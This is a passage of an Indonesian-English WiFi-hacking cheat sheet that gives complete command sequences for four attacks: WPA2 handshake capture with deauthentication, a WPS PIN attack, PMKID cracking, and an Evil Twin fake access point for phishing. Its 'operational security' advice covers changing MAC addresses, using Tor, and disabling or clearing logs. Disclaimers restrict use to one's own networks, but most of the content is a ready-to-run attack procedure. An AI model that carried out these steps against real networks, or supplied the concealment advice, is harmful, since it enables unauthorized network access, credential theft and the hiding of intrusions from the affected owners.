#### **Issue 9: VM USB passthrough issues**

```bash
# VirtualBox:
# 1. Install Extension Pack
# 2. Enable USB 3.0 controller in VM settings
# 3. Add USB filter for TP-Link adapter

# VMware:
# 1. VM → Removable Devices → TP-Link → Connect
# 2. If grayed out, install VMware Tools

# Best solution: Use bare metal Kali Linux
```

#### **Issue 10: Interface disappears**

```bash
# Check if killed by rfkill
sudo rfkill list

# Unblock if blocked
sudo rfkill unblock wifi
sudo rfkill unblock all

# Replug adapter
# Check again
iwconfig
```

---

## 📊 Performance Optimization

### Maximize Capture Rate

```bash
# Set channel width to 20MHz (more stable)
sudo iw dev wlan0mon set channel 6 HT20

# Disable power management
sudo iwconfig wlan0mon power off

# Set TX power to max (if supported)
sudo iwconfig wlan0mon txpower 30

# Priority for aircrack processes
sudo renice -n -20 -p $(pgrep airodump)
sudo renice -n -20 -p $(pgrep aireplay)
```

### System Optimization

```bash
# Disable unnecessary services
sudo systemctl stop bluetooth
sudo systemctl stop cups
sudo systemctl stop avahi-daemon

# Increase file limits
ulimit -n 65536

# CPU governor to performance
sudo cpupower frequency-set -g performance

# Disable swap (if enough RAM)
sudo swapoff -a
```

---

## 🎓 Complete Attack Scenarios

### Scenario 1: WPA2-PSK Home Network

```bash
# Goal: Crack WPA2 password dari home network

# STEP 1: Setup
sudo airmon-ng start wlan0
sudo airmon-ng check kill

# STEP 2: Scan
sudo airodump-ng wlan0mon
# Note: BSSID, Channel, ESSID

# STEP 3: Target capture
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# STEP 4: Deauth (new terminal)
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# STEP 5: Wait for handshake
# Look for: [ WPA handshake: AA:BB:CC:DD:EE:FF ]

# STEP 6: Stop capture (Ctrl+C)

# STEP 7: Crack
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# STEP 8: Cleanup
sudo airmon-ng stop wlan0mon
sudo systemctl start NetworkManager
```

### Scenario 2: WPS PIN Attack

```bash
# Goal: Crack via WPS vulnerability

# STEP 1: Setup
sudo airmon-ng start wlan0

# STEP 2: Scan WPS
sudo wash -i wlan0mon
# Look for: Lck = No

# STEP 3: Attack
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv -d 2 -K

# STEP 4: Wait (bisa 2-10 jam)
# Output: WPS PIN & WPA PSK

# STEP 5: Cleanup
sudo airmon-ng stop wlan0mon
```

### Scenario 3: PMKID Attack (No client)

```bash
# Goal: Crack WPA2 tanpa client

# STEP 1: Setup
sudo airmon-ng start wlan0

# STEP 2: Capture PMKID
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
# Wait 1-2 minutes, Ctrl+C

# STEP 3: Convert
hcxpcapngtool -o pmkid.22000 pmkid.pcapng

# STEP 4: Crack
hashcat -m 22000 pmkid.22000 /usr/share/wordlists/rockyou.txt

# STEP 5: Show result
hashcat -m 22000 pmkid.22000 --show

# STEP 6: Cleanup
sudo airmon-ng stop wlan0mon
```

### Scenario 4: Evil Twin Attack

```bash
# Goal: Create fake AP untuk phishing

# STEP 1: Setup monitor mode
sudo airmon-ng start wlan0

# STEP 2: Scan target
sudo airodump-ng wlan0mon
# Note: BSSID, Channel, ESSID

# STEP 3: Create fake AP
sudo airbase-ng -e "TargetWiFi" -c 6 wlan0mon

# STEP 4: Configure at0 (new terminal)
sudo ifconfig at0 up
sudo ifconfig at0 10.0.0.1/24

# STEP 5: DHCP server (new terminal)
cat > /tmp/dnsmasq.conf << EOF
interface=at0
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
EOF
sudo dnsmasq -C /tmp/dnsmasq.conf -d

# STEP 6: Deauth real AP (new terminal)
sudo aireplay-ng --deauth 0 -a REAL_BSSID wlan0mon

# STEP 7: Monitor connections
# Clients akan connect ke fake AP
```

---

## 📚 Best Practices

### Legal & Ethical

1. **Only test YOUR OWN networks**
2. **Get written permission** untuk pentesting
3. **Never deploy** di public space
4. ❌ **Never** crack neighbor's WiFi
5. ❌ **Never** use stolen credentials

### Technical

1. **Always use monitor mode**
2. **Kill interfering processes** (airmon-ng check kill)
3. **Set proper channel**
4. **Check signal strength** (closer = better)
5. **Verify handshake** before cracking
6. **Use good wordlist** (rockyou.txt minimum)
7. **Backup capture files**
8. **Clean up** after attack (stop monitor mode)

### Operational Security

1. **Change MAC address**
2. **Use VPN/Tor** untuk anonymity
3. **Disable logging** jika possible
4. **Use disposable VM** untuk attacks
5. **Encrypt storage**

---

## 📖 Quick Reference Card

### Essential Commands

```bash
# Setup
sudo airmon-ng start wlan0
sudo airmon-ng check kill

# Scan
sudo airodump-ng wlan0mon

# Capture handshake
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crack
sudo aircrack-ng -w wordlist.txt capture-01.cap

# Cleanup
sudo airmon-ng stop wlan0mon
sudo systemctl start NetworkManager
```

### Common Wordlists

```bash
/usr/share/wordlists/rockyou.txt        # 14M passwords
/usr/share/wordlists/dirb/common.txt     # Common words
/usr/share/wordlists/metasploit/         # Various lists
```

### Signal Strength Guide

```
-30 dBm  ★★★★★  Excellent (sangat dekat)
-50 dBm  ★★★★☆  Very good
-60 dBm  ★★★☆☆  Good
-70 dBm  ★★☆☆☆  Fair (minimal)
-80 dBm  ★☆☆☆☆  Poor
-90 dBm  ☆☆☆☆☆  Very poor (terlalu jauh)
```

---

## 🏆 Success Tips

### Maximize Success Rate

1. **Signal Strength** - Dekat dengan target (< -60 dBm)
2. **Active Clients** - Tunggu ada client connected
3. **Good Wordlist** - Minimal rockyou.txt
4. **Patient Deauth** - Jangan terlalu agresif (prevent lockout)
5. **Verify Handshake** - Check sebelum crack
6. **GPU Acceleration** - Gunakan hashcat dengan GPU
7. **Multiple Attempts** - Coba beberapa kali jika gagal

### Time Estimates

```
WPA2 Crack (with wordlist):
- rockyou.txt (14M): 5-30 minutes (CPU)
- rockyou.txt (14M): 1-5 minutes (GPU)
- Custom wordlist: Depends on size

WPS PIN Attack:
- Vulnerable AP: 2-10 hours
- With Pixiewps: Instant - 5 minutes

PMKID Attack:
- Capture: 1-5 minutes
- Crack: Same as WPA2
```

---

## 📝 Cheat Sheet Summary

### Pre-Attack Checklist

- [ ] TP-Link TL-WN722N v1 detected (Atheros AR9271)
- [ ] Driver ath9k_htc loaded
- [ ] Monitor mode active
- [ ] Signal strength good (< -70 dBm)
- [ ] Interfering processes killed
- [ ] Wordlist prepared

### Attack Checklist (WPA2)

- [ ] Scan networks
- [ ] Identify target (BSSID, Channel, ESSID)
- [ ] Start airodump capture
- [ ] Wait for client or deauth
- [ ] Capture handshake (verify!)
- [ ] Run aircrack-ng with wordlist
- [ ] Success or try different wordlist

### Post-Attack Checklist

- [ ] Stop monitor mode
- [ ] Restart NetworkManager
- [ ] Backup capture files
- [ ] Clear logs (if needed)
- [ ] Change MAC back (if changed)

---

## 🎯 Resources

### Official Documentation
- **Aircrack-ng:** https://www.aircrack-ng.org/
- **Reaver:** https://github.com/t6x/reaver-wps-fork-t6x
- **Hashcat:** https://hashcat.net/

### Learning
- **Aircrack-ng Tutorial:** https://www.aircrack-ng.org/doku.php?id=tutorial
- **WiFi Hacking Guide:** https://null-byte.wonderhowto.com/
- **Wireless Security:** https://www.sans.org/

### Tools
- **Wifite:** Automated wireless attack tool
- **Fluxion:** Automated Evil Twin
- **WiFi-Pumpkin:** Rogue AP framework
- **Fern Wifi Cracker:** GUI wireless security auditing

---

**Happy Hacking! 📡🔓 (Legally & Responsibly)**

---

*Cheat sheet ini untuk **EDUCATIONAL PURPOSES ONLY**.*  
*Hanya gunakan di **NETWORK ANDA SENDIRI**.*  
*Author tidak bertanggung jawab atas **PENYALAHGUNAAN**.*  

** PERINGATAN HUKUM **
- UU ITE Pasal 30, 32, 46 (Indonesia)
- Computer Fraud and Abuse Act (USA)
- Computer Misuse Act (UK)
- **Hukuman: PENJARA + DENDA**

**Version:** 1.0  
**Last Updated:** January 12, 2026  
**Author:** TangselSecTeam - Batch 1  
**Device:** TP-Link TL-WN722N v1 (Atheros AR9271)  
**OS:** Kali Linux
